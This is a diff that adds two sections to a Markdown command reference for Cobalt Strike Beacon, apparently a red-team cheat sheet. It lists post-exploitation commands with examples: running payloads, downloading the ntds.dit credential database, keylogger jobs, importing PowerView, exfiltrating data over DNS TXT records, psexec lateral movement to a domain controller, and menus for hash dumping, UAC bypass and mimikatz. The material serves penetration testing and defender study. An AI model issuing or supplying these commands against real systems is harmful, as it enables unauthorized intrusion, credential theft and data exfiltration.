@@ -1797,4 +1797,179 @@ screenshot | screenwatch 1000 | keylogger | keylogger stop | clipboard | desktop
 
 ---
 
+---
+
+## 22. Missing & Lesser-Known Commands
+
+### `execute`
+
+Execute a program on the target with **no output captured** (fire-and-forget — faster than `run`).
+
+```
+execute <program> [args]
+
+beacon> execute C:\Temp\payload.exe
+beacon> execute cmd.exe /c start calc.exe
+```
+
+> Use when you don't need output and want minimal footprint. No fork&run — runs directly.
+
+### `downloads`
+
+List all file downloads currently in progress from this Beacon.
+
+```
+beacon> downloads
+ Name                   Size         Progress
+ ----                   ----         --------
+ C:\Windows\ntds.dit    50,331,648   12%
+```
+
+### `cancel`
+
+Cancel a file download that is in progress.
+
+```
+cancel <file_name_or_*>
+
+beacon> cancel ntds.dit
+beacon> cancel *           # cancel all downloads from this Beacon
+```
+
+### `jobs`
+
+List long-running post-exploitation jobs (keylogger, screenwatch, browserpivot, etc.).
+
+```
+beacon> jobs
+ JID  PID   Description
+ ---  ---   -----------
+   1  5120  keylogger
+   2     0  screenwatch
+```
+
+### `jobkill`
+
+Kill a running post-exploitation job by JID.
+
+```
+jobkill <jid>
+
+beacon> jobkill 1
+```
+
+### `powershell-import`
+
+Import a PowerShell script into Beacon's memory so its functions become available to subsequent `powershell` and `powerpick` calls.
+
+```
+powershell-import <local_script_path>
+
+beacon> powershell-import /opt/tools/PowerView.ps1
+beacon> powerpick Get-DomainUser -SPN    # PowerView function now available
+```
+
+> The imported script persists for the lifetime of the Beacon session (until `powershell-import` is called again with a new script, or Beacon exits).
+
+### `mode` (DNS Beacon only)
+
+Switch the DNS Beacon's data channel protocol.
+
+```
+mode dns        # Use DNS A records (default)
+mode dns-txt    # Use DNS TXT records (more data per query, but noisier)
+mode dns6       # Use DNS AAAA records (IPv6 format, covert)
+mode http       # Switch to HTTP (if listener also has HTTP fallback)
+
+beacon> mode dns-txt
+beacon> mode dns6
+```
+
+> DNS-TXT offers higher throughput (~250 bytes per record vs ~15 for A). Use when exfiltrating large files over DNS.
+
+### `runu`
+
+Execute a program under the context of another process (runs in another process's token context, similar to `spawn` but single command).
+
+```
+runu <pid> <program> [args]
+
+beacon> runu 4812 cmd.exe /c whoami
+beacon> runu 1234 C:\Temp\payload.exe
+```
+
+### `psexec` (standalone)
+
+Use PsExec-style service execution to run a command on a remote host (lower-level than `jump psexec`).
+
+```
+psexec <target> <share> <service_name> <service_description> <arch> <listener>
+
+beacon> psexec dc01.corp.local ADMIN$ "SvcUpdate" "Windows Update Service" x64 lab-https
+```
+
+### `execute-module`
+
+Execute a Beacon Object File module (alias for `inline-execute` in some contexts).
+
+```
+beacon> execute-module /opt/bofs/sa.o
+```
+
+### `argue` (extended syntax)
+
+Clear a previously set argument spoof for a specific binary.
+
+```
+beacon> argue C:\Windows\System32\notepad.exe    # set spoof (no args = clear)
+```
+
+### `blockdlls` — per-job vs. global
+
+`blockdlls` applies to all **future** jobs. Already-running jobs are unaffected. It works by setting a job-level policy that blocks DLLs without a valid Microsoft signature via Process Mitigation Policy.
+
+```
+beacon> blockdlls start    # all future fork&run jobs block 3rd-party DLLs
+beacon> blockdlls stop     # revert to allowing all DLLs
+```
+
+---
+
+## 23. Beacon Metadata & Beacon Management
+
+### Viewing All Beacons
+
+```
+View → Sessions     # table of all active Beacons with metadata
+```
+
+Columns: ID, last callback, sleep, host, user, process, PID, arch, listener, note.
+
+### Beacon Context Menu (Right-click)
+
+```
+Interact          → open Beacon interaction window
+Access            → sub-menu: dump hashes, elevate, bypass UAC, pth, run mimikatz
+Explore           → sub-menu: browser pivot, desktop, file browser, net view, port scan, process list, screenshot
+Pivoting          → sub-menu: SOCKS, listener, rportfwd
+Spawn             → spawn in new listener
+Session           → sub-menu: note, color, remove
+```
+
+### Coloring Beacons
+
+Useful for visual organization (e.g., red = DA, green = standard user):
+
+```
+Right-click → Session → Color
+```
+
+### Removing a Dead Beacon
+
+```
+Right-click → Session → Remove
+```
+
+---
+
 *Last updated: 2026-06-09 | Reference for authorized red team use only.*
